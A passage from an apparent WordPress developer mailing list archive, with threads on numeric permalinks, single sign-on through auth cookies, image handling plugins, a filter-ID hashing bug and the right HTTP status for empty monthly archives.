the form of "89.1234, -33.1234" to hold their geo data. I think this
is because the earliest plugin "Geo" used this format, and so
compatibility was a good thing.

If we're extracting the EXIF Geo data from an attachment, then the
post for that attachment should get this metadata in this format as
well.

I am amused at the image of Mike sitting at a typewriter tapping out
his patch and sending it to Alex in an airmail envelope. Maybe you
should be too.

Great discussion. +1 for improving the forum and its plugin help
capabilities (and maybe a field for defining bounties for
answers/fixes). Seems like a
bit of work could make a lot more devs interested in using it.

Heh! I meant "offline" as someone would say at a seminar during Q&A. Maybe "offlist" would have been better. :)

Indeed! We just had a thread about this in January, although the typo in
the subject ("filter the_exceprt") makes it hard to find in a search of the
archives.  

Such a patch is beyond my skill (and time, at the moment) but I'd really
love to see the_excerpt take some arguments to make it more flexible.

Message-ID: <AFF9A1A87EACDD418AF3FC7B77548E610366FD3B@MI8NYCMAIL17.Mi8.com>

I've confirmed this with a new install with no plugins to make sure
nothing was interfering.  Is there a reason why wordpress won't
recognize a title that is purely numeric in the permalink?  If this is
by design, should it give a warning on saving of the post to notify it
is not a valid slug.  I would actually prefer to allow this
functionality. Maybe it is just a bug but wanted to make sure this is
not by design first.

 

Example: using permalinks as: /%category%/%postname%/  (note: if I set
to just /%postname%/, then it works - but I want to have the category)

 

Have a category with slug: test

Have a post with title/name: 12345

 

It will not recognize this as a valid url:
http://mydomain.com/test/12345/  - Returns a 404

 

If I change the slug to be A12345, then I can go to:
http://mydomain.com/test/A12345/

 

I am building a medical code lookup site where I actually want a numeric
number to be the title of the post - by adding another character to the
title, I actually make it more confusing to user.  I can do something
like: 'Code-12345', but would prefer to keep it as '12345'

 

Any reason why I shouldn't be able to accomplish that?  When I changed
the permalink structure to just /%postname%/ it worked, but then I lose
the category.  So, why shouldn't it work when I include the category in
permalink?

 

Thanks,

 

Dan

Known issue. Numeric slugs don't work anywhere in WordPress.

http://core.trac.wordpress.org/ticket/5305

Core reason is that it uses digit matching as part of the permalink
patterns for year/month/day type of things, so numeric slugs confuse
it.

No real fix at present.

Known issue. Numeric slugs don't work anywhere in WordPress.

http://core.trac.wordpress.org/ticket/5305

Core reason is that it uses digit matching as part of the permalink
patterns for year/month/day type of things, so numeric slugs confuse
it.

No real fix at present.

I have an existing PHP-based web app (non-wordpress) that is going to
be handling authentication (user login, etc.). I want to use that same
authentication system
to carry into the /blog (wordpress powered).

Is this possible?

I've googled, but haven't found a lot of good examples of doing this.
Any links / guidance / etc. would be welcomed.

I am not the developer of the existing PHP-based app, but I have been
in touch with the developer and he is flexible in making things work
the way I need them to
play friendly with wordpress.

Thanks in advance.

Thanks Otto - after looking at viper007bond's plugin it only works for
adding numeric stubs to pages, not posts ( he just adds filter for
'page_rewrite_rules').

Im not too familiar with the rewrite rules, so would be afraid of
breaking anything, but if I used his same function, but modified for
posts:
Add_filter('post_rewrite_rules', 'allow_numeric_stubs_post' );

Then changed his allow_numeric_stub to:
function allow_numeric_stubs_post( $rules ) {
	unset( $rules['(.+?)(/[0-9]+)?/?$'] );

	$rules['(.+?)?/?$'] = 'index.php?p=$matches[1]';  //just replace
'pagename' with 'p'

	return $rules;
}


Do you think that would work for posts?  I will try it out and see what
happens.....

Having full numeric post titles with leading category will be handled as 
it would be a static page, that has been paged.
This is normal behavoir and need no plugin. The <!--nextpage--> has be 
supported by TinyMCE since a lot of versions but
the button has not been shown at the editor. Only TinyMCE Advanced was 
able to attach it.

May be, that needs a re-ordering of post at front of rule sets and 
afterwards the static pages, but with a huge amount of posts, it will 
take some time to match static pages than.

Also the paged pages can be re-used and extended to act as columns (for 
static pages only) and can be tested here 
http://wordpress.org/extend/plugins/page-columnist/

He is looking for single sign on across applications.  But using the
non-wordpress app as the authoritative authentication mechanism.  So
you log into the non-wordpress app and are authenticated for both the
wordpress install and the non-wordpress app.

This would actually be relatively simple.

Wordpress uses a cookie only authorization scheme, so, upon authentication, the external app would 
just have to set the proper cookie, and you'd be good to go.

A good starting point would be looking at the wp_set_auth_cooke()/wp_clear_auth_cookie() functions 
and the methods that they use.

A good example is this plugin:

http://wordpress.org/extend/plugins/external-database-authentication/

I'm actually using it as a base for another project, and it's quite  
handy.
Also, have a look in what's in wp-includes/pluggable.php.

Creating the cookies is the easy part.  The more interesting things will be
redirecting login attempts at your blog to the authoritative system, while
remembering where the user was in the blog so you can take them back,  as
well as pushing new users into wordpress when they are created at the
authoritative system.  Some of this can be avoided if you can expect that
the user will always visit the authoritative app before they hit the blog.

Hi Joost,

I think it would be ok to include a IFRAME showing your ad. Then it's
up to the browser separating the different domains and handle security
issues. IMHO better than retrieving ad code via PHP and "try" to
filter out bad things.

Maybe you can add a small link next to the ad which removes it
forever, in case access to you website / adserver is blocked and your
ad causes some delay on every page load. People who would hide your ad
even if it's correctly shown and doesn't cause problems probably won't
ever click on it anyway...

Regards,

  Arne

Remember that in opensource community, when a project does something beyond
acceptance, or when people think there are ways to improve it, they could
just fork it.

What prevents others from removing ads, etc. and then redistribute the
plugin?

If you provide value beyond the code, such as support, community, etc, you
are close to discovering the real value that you can monetize, so why the
ads at all?

The reason to use Subversion is that it is faster, safer, and can be 
automatic without need for direct WordPress support. Also, I've been 
moving plugins to Subversion as well, as an external, this means that 
plugins can be upgraded as well.

The goal is to make the upgrade process as seamless and quick as 
possible. A SVN update does not require updating files which have no 
changed and even those that changed, it only downloads the changes that 
have occurred with each version. Therefore, I mean, by moving to a 
strictly Subversion checkout for both core and Plugins, I bypass the 
need for the automatic upgrades.

The only issues I have is that it is hella pain-in-the-ass moving the 
wp-content directory. Don't get me wrong, it is extremely easy to do it 
in WordPress, it is just that testing is a pain in the ass. Having to 
explain the exact defines that are required and everything is a little 
extreme. Besides that, once it is set up, it is super sweet.

An alternate option might be to replace all the user-related functions
with your own, which determine credentials and such. All those
functions are pluggable, meaning you can simply replace them with
functions of the same name in a plugin and authenticate your users
however you like.

As an aside, if you have a WordPress database that has been around
since WordPress 1.0 - 1.2, you will still have 'post_lat' and
'post_lon' columns in the main wp_posts table! Not that I'm advocating
modifying the main table.

I agree a standard meta data name makes sense, as does one which has
been around for a while. My only minor reservation about a combined
field, is that it is a little harder to parse than separate long and
lat.

Any plugins or themes taking advantage of such meta data ought to cope
with different values for attachments and no value or a list of values
for the parent post.

The reason to have them together is so you can pull them both out
together. There's never an occasion where you need one and not the
other.

And splitting them isn't that hard. If you've got "123.567,-12.345"
then all you have to do is:

$meta = trim(get_post_meta($post->ID, '_geo_location', true));
list($lat, $long) = split(',', $meta);

And voila.

That is also not difficult:

RewriteRule ^wp-login.php$ /my/login/url [QSA,PT,L]


As far as "pushing" users and making sure two different databases are in sync, it's _much_ easier 
just to force one of the applications to use the others user database.

In this case, just have the two share a wp-style users table, the same way you can with multiple 
installs. That is, by defining the CUSTOM_USER_TABLE CUSTOM_USER_META_TABLE constants.

Lat and Long do go together like rama lama lama ke ding a de dinga a dong.
Sorry, Grease Ref there.

They do go together but really should be stored separately, or at least as a
serialized array. Data and presentation separation. It is possible for
someone to want to compute mathematical formulas on Latitutde or Longitude
individually. Each should also be filtered.

And yes, +10 for geocode info gathering. It always bothered me, as a
photographer, that WP seems to have a crippled approach to EXIF/IPTC data.

Hey guys,

I have two bugs from a while back that seem to have gone ignored:

https://core.trac.wordpress.org/ticket/8723
https://core.trac.wordpress.org/ticket/8731

I'm wondering if there's something I'm doing that causes these bugs to go
unnoticed?  I feel bad assigning them to random people, but I would like
them to be discussed, and they need a consensus before I can submit a patch
for them.

Thanks,
Brian

Since I'm the one to write the patch which contributed the most to 
_wp_filter_build_unique_id(), I'll say that you are doing it wrong. The 
function was never meant to handle your use case. It is working as it 
supposed to. The issue is that you are changing the data of what the 
function sees as the same instance (it isn't, which is where it appears 
the bug stems from).

If you work it out, the first instance works out to Foobaz0 and the 
second instance should work out to Foobaz1. This is assuming that the 
plugin code is isolated. I will have to take a further look at it, 
because it does not seem like bar() is doing anything in your example, 
but the result should be "12" and not just "2". So most likely your use 
case was not tested fully. That is easy enough to correct, just write 
test cases for your example and see what happens and if it fails, then 
attempt to fix it until the tests pass.

Where you are incorrect is that once array(&$this, 'bar') is added to 
'something1', it should gain the _wp_filter_id to 0 and when 
array(&$this, 'baz') is added to 'init' hook, the _wp_filter_id should 
already exist. You are correct in that when the second instance is 
created and it goes to add array(&$this, 'bar') to 'something2' it will 
not find _wp_filter_id, nor will it find any other items in 
'something2', so it will also set it to 0. You are correct in that 
instead of getting the correct 'Foobaz0' and 'Foobaz1', you end up with 
both 'Foobaz0'. Interestingly, if you had something actually echoed in 
'bar', you'll probably see both items (in theory). In the case of the 
'init' hook, the second instance is replacing the first, which is why 
you only see '2'.

This could be fixed if you had the 'init' hook first instead of second. 
It is probably why the static method worked in your case, because for 
static methods, the _wp_filter_id is not set, therefore when it gets to 
the init hook, it sets it and then counts the amount of the hooks. It 
seems like your bug is probably biting the asses of all of the dumbasses 
who are writing their plugins incorrectly. Good chance!

Unfortunately, I do not see a fix at this time. If you can think of 
another algorithm to make the function more idiot proof, it should 
suffice until the world creates a bigger idiot (not you, you found the 
problem and reported it, I'm talking about those who are affected by 
this and don't know it).

Jacob Santos

PS: It will it go a long way to getting things solved, if you create a 
patch for a possible solution. I could really care less for #8731, 
therefore someone else is going to need to look at it or you are going 
to have to handle it yourself. Now, I might have some interest in it if 
you slap me around a little and threaten to harm my next door neighbor 
who I could also care less about.

Tickets with patches on them are likely to get more notice simply  
because of the large amount of them that already exist and the limited  
amount of time I have.

You also need to ensure that you have a clear description of the  
problem.

I got a bit confused reading #8723 the first time.

I have been playing with WPMU for the last couple days and other than
running into the redirect loop issue, it hasn't been too hard to
figure out.

That said, without the ability to modify the httpd.conf file (which I
can't with my hosting plan), there doesn't seem to be any way to make
WPMU work with subdomain names for each blog.

I could upgrade my plan but that is overkill for my need so I am going
to ltake a ook at the wp-hive plugin.

Thanks,

Mike

Mike,

There is a third way. You can force all the blogs in your network to  
share the same database tables for users and users_meta while  
retaining their own stuff for everything else. It just takes a little  
bit of wp-config.php fu and you're done.

Let me know if you want me to go into more detail. I've been meaning  
to blog about this anyway, since I wrote a plugin to overcome one of  
the drawbacks in this approach: http://xentek.net/code/wordpress/plugins/wp-orphanage/

You could copy the 'active_plugins' option from the 'wp_options' table
in the database.

This plugin looks very interesting and appears to have the potential
to do what I need to do.  I ran it through some paces today and found
a couple of issues.  I posted it on your forum.

Thanks for the pointer.

I thought some of the readers of the list might be interested in my
new plugin, WordPress User Switching. It allows one-click switching
between user accounts in WordPress. Handy for test environments.

Subject: [wp-hackers] Inclusion of TimThumb -- anyone game?
Message-ID: <000e0cd483001f936304646373ca@google.com>

I've noticed a lot of "premium" themes (most recent being the Ma.tt-linked  
Smashing Magazeen) are starting to include TimThumb along with their  
themes. Easy thumbnail generation, allows for a lot of flexibility on theme  
authors' parts, etc. MIT-licensed.

(Must have GD installed, of course, for it to work.)

So, that being said, the question arises: does anyone else see a use case  
for including it in WordPress? Recall we had similar discussions in re:  
inclusion of the various JS libraries and "include 'em all and let the  
plugin/theme devs sort it out!" was the eventual decision. Oh, and the  
wonderful wp_enqueue_script() functionality followed...

Grist for the mill, but I come down on the "tentative 'yes'" side of things.

Doug,
WordPress already includes an image resizing feature when you upload new
images (creates a medium and thumbnail size image).  However, I've been a
little curious as to how plugin/theme developers can use those features
themselves.

I'd like to formally ask for the hackers' help on this one.  If there is a
way for a theme/plugin to take advantage of the image upload and resize
functions, I'd certainly appreciate a point in the right direction.

As far as timthumb, I don't think it would be necessary in core if the same
thing could be accomplished using pre-existing WordPress functions.

What's needed for that is for WP to have a function like the_icon() or  
the_image() that works like the_content() and and the_title(). The  
question, however, is how to set that image when creating posts.

I implemented something like that in my bSuite plugin; it adds a  
metabox to the post/page editor that allows post authors to define the  
"icon" representing the post. Still, I'd love for WordPress to have a  
similar feature built-in.

I've done this for clients in the past like this:

1) Tell them upload an image to their post (but don't actually "send
to editor". Just upload so its associated with the post).
2) Tell them to title it something specific like post_image, icon, or
whatever you want.

Then, in your php loop
* Use this psuedo code:  select id from wp_posts where type is image
and parent is [current post] and post_title is [post_splash] limit 1
* Run it through <?php wp_get_attachment_image( $image_id ,
array(75,75), false); ?> and you're golden. (second argument - the
array - is your image dimentions)

BTW, there are a lot of cool functions / filters when you start
digging through wp_get_attachment_image and the functions it depends
on. They're all in wp-includes/media.php.... including image_resize();

I have a better solution. I wrote a Media Tags plugin back Dec 2008 so  
I can stop asking the client to name the image with a certain pattern.  
Now when the image is uploaded they can simply 'tag' the image as  
needed. Most of the time the tags don't change. But the client wants  
to upload a new version of a sidebar image or whatever.

Hosted on wordpress.org http://wordpress.org/extend/plugins/media-tags/
See details on the plugin here: http://www.codehooligans.com/2008/12/14/media-tags-plugin/

This plugin also help prevent the spread of hard-coded SQL commands in  
your template code that may break if/when WP core schema changes. All  
you need to do in your loop is call the function like this:

$media_items = $mediatags- 
 >get_media_by_tag('media_tags=sidebar&post_parent='. $post->ID);

Replace 'sidebar' with the tag marked for the image. The $media_items  
returned will be an array. Then you can call the  
wp_get_attachment_image() function as suggested.

Just for the record: I don't use hardcoded sql :)
I usually use the get_children function:
$images = get_children(
'post_type=attachment&post_mime_type=image&post_parent=' . (int)
$this->post_id.'&orderby=menu_order&order=ASC' )

The above code comes from my wp-ecards [1] plugin where I'm not doing
exactly what we're talking about here, but close. To use it like I
mentioned above, you would just have to add the post_title and limit
arguments.

I strongly agree with this. And even if it gets voted down for core I'd like to see those of us who see the need collaborate on a plugin that can be considered the default for such functionality.

As I see it we'd need something like this (I present these as a starting point for discussion):

the_image([$args]) where $args could include at least:

'size' => '{width}x{height}' (i.e. 300x250) or a named size, i.e. 'main', 'tall', 'wide', 'sidebar_thumb' etc. where there would only be one "reserved"  named size (i.e. 'original'?) which would be the default when not specified, and the rest would be configurable in wp_options.

'imagenum' => 0 by default where 0 is the first (and possibly only) image which means we'd need a image_count() function.

A very important component of this is how to store this information in wp_postmeta and elsewhere.  

If we do this it can become a building block for a lot of plugins (including my image cropper plugin that I've not yet released.) That would IMO be the most important reason to do this.

Just so I don't come across as devils advocate / combative or whatever  
let me say, I'm in favor of something like this being implemented.

One question though, how would the_icon() or the_image() work?   
the_content() and the_title() works because those are single fields on  
the post entry form.  I'm not sure adding a "post image" field to the  
add/edit post screen is a good idea.  Would flagging the image in some  
way through the media uploader be too complex for the user?

Any ideas?

FWIW, I was excited about the Media Tags plugin plugin for my current project but found that it didn't work well for the client's workflow because it is too free-form and because of how it stored its data in the database. I ended up writing a custom plugin for "video channels."

While I still think Media Tags is conceptually a good plugin and really useful as is, it doesn't address use cases where there is a need for the admin to explicitly specify a selection of specific sizes with optionally named specific roles.  It also doesn't (currently) store rich enough data in the databasse to associate the image type of "sidebar" with the fact that the sidebar image must be, for example, 120x180. Even more, it stores its media tags solely in postmeta instead of in the taxonomy tables where it could better leveraged by additional types of SQL queries.

Actually, I'd love to see media tags functionality rolled into the core to address the free-form tagging use-case, but would want to see it rearchitected to use taxonomny before that was done.  For the use case that requires structured image functionality, see my previous email.

FWIW, I've done a lot of the code for this in my past several projects and, if we can agree on what it should look like I can either contribute the code to the core or provide a plugin that meets the design agreed to by the community, or collaborate with others to do the same.

Mike,

Thanks for your thoughts on the Media Tags plugin. It was written and  
released just for tagging not really for association of the 'size' of  
an image. That responsibility is still on the shoulders of the of the  
uploading user. As for the comment about storing the tags in the post- 
meta I totally agree. Again this was written to quickly and in the  
mind that a given post would have associated images. The Media Tags  
plugin provided the need to filter through the various posts' images  
without resorting to use kludges in the image name or title. I've been  
working on the next release of the plugin that does the taxonomy table  
to store the tags. This change will facilitate the search for tagged  
image across all posts not just the current loop item.

Thanks again.
Paul

I started messing around with code to handle robust image resizing some 
time ago. Since then, it has grown to a nice utility to make working 
with images and files in general fast and simple.

The reason I built something separate from core is because of the 
following reasons:

    * Limitations on growing rather than just shrinking to match dimensions
    * Inability to cache
    * Inability to handle animated images
    * Difficult and overly-complex interface

The features that my code has is as follows:

    * Easy file uploading complete with adding the file to the media library
    * Image resizing with the following options and features:
          o max width/height
          o option to crop image to match resize dimensions
          o easily defined destination
          o set jpeg quality
          o set format (you can convert the image from a jpg to a gif)
          o resizes png images while preserving transparency
          o resizes animated images
    * Convert a file URL to a file path
    * Convert a file path to a file URL
    * Determine MIME type
    * Easily get file attachment data
    * Delete file attachments and their files
    * Determine if a file is an animated gif

My code isn't clean enough to send out at the moment, but I should have 
a link to it on the list later on today. Hopefully what I've developed 
can become the launching point for the plugin or core update that 
everyone will end up building from this discussion.

call me crazy, but i've never been one for image resizing on the fly :)

you can easily add more image sizes via a plugin or functions.php and 
specify whether images get cropped to that size or not.
now, that does leave you with a few more files per uploaded image which 
might fill your web space somewhat faster, but there certainly are ways 
to deal with that (circumventing the creation of _all_ sizes for _all_ 
files, that is).

for cropping on the fly when an image is uploaded, scissors plugin works 
like a charm.

i understand that these features aren't at the reach of an everyday 
user's fingertips in form of some built-in function, but i'd rather 
leave these things to plugins and themes than have them in core.

There are the following filters available for plugin users
  image_downsize
  image_make_intermediate_size
  editor_max_image_size
  jpeg_quality

All used in wp-includes/media.php. Take a look at the code to see how
to use them.

Oh, hopefully you didn't get me wrong, it's a good plugin I plan to use if and when it fits my use-cases. Many of my plugins meet specific use-cases but not general use-cases; we build what we need when we need it!  OTOH, glad to see Media Tags is moving in the direction of using taxonomy; that would be quite helpful.  BTW, it would also be nice if you could constrain taxonomy in general or my mime class (i.e. 'image') or mime type (i.e. 'image/jpeg'). 

My only comments were to say I didn't think the functionality in the Media Tags plugin is ready for inclusion in core as is, and I'd love to see a "standard" way baked into core for plugins and themes to deal with images.

Mike,

Thanks for your thoughts on the Media Tags plugin. It was written and  
released just for tagging not really for association of the 'size' of  
an image. That responsibility is still on the shoulders of the of the  
uploading user. As for the comment about storing the tags in the post- 
meta I totally agree. Again this was written to quickly and in the  
mind that a given post would have associated images. The Media Tags  
plugin provided the need to filter through the various posts' images  
without resorting to use kludges in the image name or title. I've been  
working on the next release of the plugin that does the taxonomy table  
to store the tags. This change will facilitate the search for tagged  
image across all posts not just the current loop item.

Thanks again.
Paul

Wow.

I think you have been reading my dreams.

I've published the details of the image and file utility I talked about 
before at WordPress File and Image Utility 
<http://ithemes.com/wordpress-file-and-image-utility/>. It features a 
large variety of features.

Please check it out and let me know if you find it interesting, useful, 
or even vile. :)

Subject: [wp-hackers] Fast WordPress Function and Template Tag Lookups
Message-ID: <518fa9630903060832h14dc1ac9h8b211bc86b7a1276@mail.gmail.com>

I want to quickly let everyone here know of a site that one of my good
friends, Andy Stratton (http://theandystratton.com), has setup
recently.  The site is called WPLookup and can be found at
http://wplookup.com/.  It provides a simple search box for quick
lookups of WordPress functions and template tags.  If the appropriate
codex page exists for the function you are looking for it will
immediately redirect you there.  If it does not exist you will be
directed to a documentation search on http://wordpress.org/search
which will contain a list of results for you.

To make it even better the site can also integrate into your browsers
search bar keeping you from ever having to actually navigate to the
WPLookup site to do the search.

I have taken his service one step further and integrated his service
into an IRC bot.  The bot is sitting in #wordpress on freenode.  To
use the bot type something in the form of `.codex get_pages`.

Now what are you waiting for?  Check it out now at http://wplookup.com/.

Enjoy!

What would be even better would be to hook into phpdocs or a phpxref as the
codex doesn't contain the most up-to-date docs for wp fucntions.

Theres a couple of simple ways of hooking into the phpdoc sites [1],[2]

Either use the api on WordPress.org which will give you a link to the  
phpdoc.wordpress.org site and is used in trunk for the documentation  
links from the theme editor.

e.g. http://api.wordpress.org/core/handbook/1.0/?function=get_pages

Or you can build something round the shell one-liner proof on concept  
code I came up with which I hope isn't driving the backend of the  
above api

curl "http://phpdoc.wordpress.org/trunk/li_WordPress.html" | grep  
"get_pages" | sed "s/^.*'\(.*\)'.*'.*'.*$/http:\/\/phpdoc.wordpress.org 
\/trunk\/\1/"

But if you do please cache the results as they aren't going to change  
very often!

I'm not sure if it's easy to build a similar lookup off the html  
generated by phpxref [3] but it may be.

[1] http://phpdoc.wordpress.org
[2] http://phpdoc.ftwr.co.uk
[3] http://phpxref.ftwr.co.uk

Wow that's fast! Nice!

Is it your intent to have it stay at the top of the framed site once I choose a result? Or is that too much frame targeting mess?

thanks!

To make it even better, the opensearch plugins you can find here:

http://xref.yoast.com/

now support those suggestions as well, although only for functions.

Best,
Joost

We should find a way to combine this xref search with the thing you  
started the thread about... That'd REALLY rock :)

What hijacking?  Joost's page is certainly pertinent to the topic of  
"Fast WordPress Function and Template Tag Lookups"

If you were being sarcastic, sorry -- I missed the <sarcastic>tags</

Hey,

I was playing around with the WordPress.org plugin information API,  
which is pretty well documented by dd32 [1]. Based on that I've built  
a WordPress Dashboard widget which shows your downloads and ratings:

http://uploads.yoast.com/plugin-downloads-wp.png

I'd like to upload my plugin to WordPress.org, possibly replacing  
another one called plugin downloads that no longer works [2]. I've  
contacted the author of that plugin to discuss that, but in the mean  
time, you can find it here:

Best,
Joost

PS I've also developed a Mint Pepper that does the same:

If you use Mint and would like to have that Pepper, drop me a line :)

I've been using the plugin-downloads plugin for a while now, but also
adapted it. I added in a shortcode to display the stats on my site, if
you haven't added that in - can I suggest it as a feature? (feel free
to contact me off list if you want a copy of what I hashed together)

I also just recently came across plugin-info and was also pointed at
wp-plugin-data - which sounds similar to what you have done.

Exactly my point, two instances should not be considered the "same", since
every instance of a class can have its own branching.  You can't assume a
class will always add the same action as their first add_action call.

That's more or less what I did, but with my actual code: the exact fix was
swapping the init call and the other call.

I understand the reasoning here, and know the solution to the situation, but
IMHO the function doesn't follow its spec.  The spec (though not explicitly
stated), is to hash an object so that it can be stored without risk of
overwriting instances of other objects.  Since there exists a way to cause
objects to overwrite each other while still following the spec of
add_action, I see a problem.

What about using a static var that's incremented with each read to fill
wp_filter_id.  That guarantees it will be unique amongst other objects.  It
could track class names so the id stays smaller, but I see no benefit to
that...

Thanks for the advice, I didn't realize patches push things along that
well.  I'm away vacation soon, so my responses may be delayed, but my patch
is attached to the bug.

Thanks,

That is actually a pretty good solution. I'll fix your patch (must be 
.diff or .patch and not .txt) and resubmit it.

I meant "good catch."

Anyone recommend a plugin/hack to allow end users to upload videos?  
like a mini YouTube.

I would like to limit access to most features but allow video upload.  
Maybe addon to comments?

Thanks for any advice.

I've just noticed something that surprised me, that if I go to an archive page for which there are no posts for a given month that I get a 404 error which doesn't exactly provide a great user experience for people hacking URLs. Should it (at least optionally) return a 200 ok but visually there are no posts for that month?

Isn't a 404 the only semantically reasonable response?

Something we probably all need to do is make our 404 templates more  
useful, though. In the context you describe, it could easily look  
ahead and back to the next month/year/period in which their are posts,  
while still returning a 404, for example.

I agree with Casey. 404 is the most semantic response. And if they are  
hacking URLs then what user experience are they expecting? Just design  
a helpful 404 and you'll go a long way to getting them where they want  
to go.

Hello.
Does anyone know of any plugins that allow tags to be ordered?

The hard-wired tag order is alphabetical and I have a client who wants the
order in which they are typed it to be preserved. There's an ordering column
in the database but it's not being used by WP core...

Thanks in advance.

Yes, that is arguable but I thought a lot about it before I posted the question. I've actually spent a lot of time studying HTTP and proper response codes for RESTful web services so I'm very aware the purposes of response codes. I also know that many times it is a judgment call and I agree this is an area where judgment could easily come into play.

While I will certainly concede the point if most others feel it is semantically reasonable here are the two ways to look at it:

1.) The lack of posts imply there is no valid resource at the requested URI, or
2.) The lack of posts is simply a reportable state for a valid resource at the requested URI.

The basic difference is deciding if zero is a valid number of posts and at what level in the application stack a 404 should be served. Should the website deliver a protocol error or display a valid page? Isn't a page that tells the user there are no posts for that month a valid resource? Isn't a 404 page that displays results specific to the known URL a little odd?

My instincts tell me that 404 should be served for pages that the server doesn't understand nor can't make any sense of and for pages that the server can decipher 200 should be served along with a valid representation that tells the visitor about the "zero" state. I'd be happy to explore creating a patch if this is something that the committers would agree to.

The problem with a "helpful 404 page" is that such a 404 page must know about all potential error states in a system to be helpful vs. allowing the pages that already know about "the error states" to take action.  It would seem to me a lot more appropriate for a page to be able to "punt" and say "Ya know, I consider this a 404" if it wants to trigger such a use case rather than having to modify the 404 for every potential error situation.  This is like having a function called "display page" with a case statement that hard-codes (i.e. doesn't delegate to any other code) what to display for each URL; it's crazy architecture.

Problem is there is not a proper HTTP error code that I could find  
dealing with your situation. Correct me if I am wrong.

404 means not found. There are a couple of 3xx error codes, but I  
don't think any would apply to a guessed URI like your example. Giving  
a guessed URI a 200 is probably not appropriate.

Building a useful 404 is probably the best way to go. You can make  
them quite complicated and keep your 404 functionality in your theme.  
I typically use at the minimum a site page list and search form. My  
personal theme framework injects a "report broken link" form allowing  
visitors to send a notice with their e-mail address if they get there  
with a referrer. Sniffing the URI for some archive, category, tag,  
etc. wouldn't be too hard and might be a nice idea for some sites. I  
like that.

A 404 is important and personally I really wouldn't want to promote  
bad habits of URI guessing by visitors.

Are you arguing that the page shouldn't return a 404, or that WP  
should implement some more elegant hooks to handle 404 conditions?

You should take a look inside the WP_Query object. It's written to  
parse every possible legal request URL, and if you hook into in the  
right places, you'll also find opportunities to generate more useful  
404s when either the query parser fails or if the database returns no  
results (as is the case with your example).

What I was proposing is that the proper error code for a month where there are no posts is 200. That is a valid page IMO.

I addressed why that doesn't make much sense in my just prior email; I assume you sent yours before reading that one? My prior email may not change your mind but it would expect you to respond with additional justification for stuffing all the logic in one page as opposed to distributing it where the knowledge is best known.

Why is that "bad habits?" I think the only bad habits are to "guess" a URL then write a (RESTful) program that downloads the URL but breaks if the URL changes. We dicussed this topic ad-nauseum on the REST-discuss list about 2 years ago and the consensus what that guess URLs is good as long as it is humans doing it to optimize their own browsing experience.  "Guessing" URLs is really not a bad habit because the human has their own built-in error correction mechanisms. :)

Note this is my blog on the subject: http://blog.welldesignedurls.org so I've put a lot of time and thought into this subject.

BTW, in my current use-case it's not about guessing; I have a calendar with "next" and "previous" months. Why, for example, should the user get a 404 when they click "next month" where June 2009 doesn't have any posts but July 2009 does?  That makes them think my site is broken when I'd argue that it is WordPress that is broken (in this very-specific case.)

Maybe what is needed is another approach? I've taken to heart two of Peter Westwood's core principles; "WordPress is a Platform" and (something like) "Keep options to a minimum and default to the most logical."  I've interpreted the latter to mean "Options are great as part of the platform but hide as many options from the user as possible."  If I've interpreted wrong hopefully Peter will correct me.

That said it would seem that instead of hardcoding a 404 for these types of pages there should be an action/filter that determines what status code should be sent and a plugin/theme developer should be able to disable 404 generation for known patterns found in $wp_rewrite.  

Or maybe there is such an ability already built in just not one that I've been able to find?  If there is then all I need is to know it, and if there is not I'd like to propose I create a patch to add such capability.

The former is admittedly a long debate that would probably never be resolved to everyone's satisfaction and with significant bikeshedding.

So the latter is probably the best approach.

Thanks. I've review it but will give it another look.  

That said, a question; does it allow me to say "Don't generate a 404, just continue on and run the archive page as you would for any month where there are posts?"  Otherwise I'll likely have to write some very convoluted code to get the results I'm looking for.  And if it doesn't I'll happily write the patch to improve it is someone can suggest what branch of code to patch?

Mike,

Trying to understand your issue with the 404 returned. Correct me if  
I'm wrong. You really want the option to do something like the search  
results return of the query returned no hits? Which my understanding  
is not a 404.

Without parsing the specifics too finely, yes that's about it.

Let me give just one hypothetical use-case (though not my current one.) I may want a monthly archive where posts are listed in the content area and Twitter updates are listed in the sidebar.  I may have no posts for a month but for an active Twitter user I may have many Twitter status updates for that month. Thus even though there are no posts the representation is still valid content.

Expand that and consider a monthly archive where the sidebar lists events pulled from external sources. Returning 404 tells clients, GoogleBot for example, that there is not a valid resource at that URI when in fact there is definitely a valid resource there the resource happens to just not contain posts. Hopefully you can see that the equating of zero posts = "file not found" is too limited.

I think, if you want to separate a 404 failed call reason from your 
use-case, it's not valid to use 200 status code.

For your reason (no content available but request still accepted and 
done) you will need status code:

204  No Content

permitted for  HTTP/1.0     HTTP/1.1     WebDAV

stating that the request has been successful done (2xx range) but no 
content has been provided yet.

If you want to support external services, give them a chance to 
differentiate between 200 (that it is) and 204 (have no further data).

Yes, that's what he is saying, and I agree entirely.  His comparison  
to a calendar say ing 'not found" for June if June doesn't have any  
posts is a good one.

If I'm in Outlook (or iCal) and switch to a month that doesn't have  
any events listed, should the calendar program tell me that the  
*month* is not found?

If going to an archive page that doesn't have any posts, WP should  
give us a page that says "no posts for this month", not "there is not  
archive page for this month".

That is not, but I think it's a slightly different use case.

- user search for something, which produces 0 results, but he's trying  
a legitimate action in WordPress. HTTP 200 with 0 results, maybe some  
post related to the search term.
- user try to get the third page of the archive of a category which  
have only 2 posts, or for a category which is not existent. This  
should be 404, until that URL have some content and will have a proper  
HTTP status code.

While 204 is a nice idea, I don't think it's acceptable either. Quote  
from the HTTP 1/1 RFC [1]:

[quote]
The server has fulfilled the request but does not need to return an  
entity-body, and might want to return updated metainformation. The  
response MAY include new or updated metainformation in the form of  
entity-headers, which if present SHOULD be associated with the  
requested variant.

If the client is a user agent, it SHOULD NOT change its document view  
from that which caused the request to be sent. This response is  
primarily intended to allow input for actions to take place without  
causing a change to the user agent's active document view, although  
any new or updated metainformation SHOULD be applied to the document  
currently in the user agent's active view.

The 204 response MUST NOT include a message-body, and thus is always  
terminated by the first empty line after the header fields.

[/quote]

Also, 404 is not the right answer, because all 4xx status suppose/ 
implies a client error, and that's not the case (even considered that  
most of 404's should be 410: Gone.).

Maybe the right way is 203, non- authoritative information, but this  
would be a really ample interpretation of the status code, and I'm not  
really sure about that. So, at this time 404 is probably the right  
choice (even if somewhat an ample interpretation of it), because the  
404 description says:

[quote]

This status code is commonly used when the server does not wish to  
reveal exactly why the request has been refused, or when no other  
response is applicable.

[/quote]

Mike - Thanks for bringing this up.  I agree with you.  In fact, I
recently submitted a patch for a similar scenario - but working with
custom taxonomies (http://core.trac.wordpress.org/ticket/9269)

I *think* that monthly archives fall under is_tax() and not
is_category() as far as determining what to do with the query, correct?
If that is the case, then it is similar to my ticket.

The difference is that my patch only returns 200 if the term/taxonomy
has posts - or if any child terms have posts.  (I added check on child
terms).

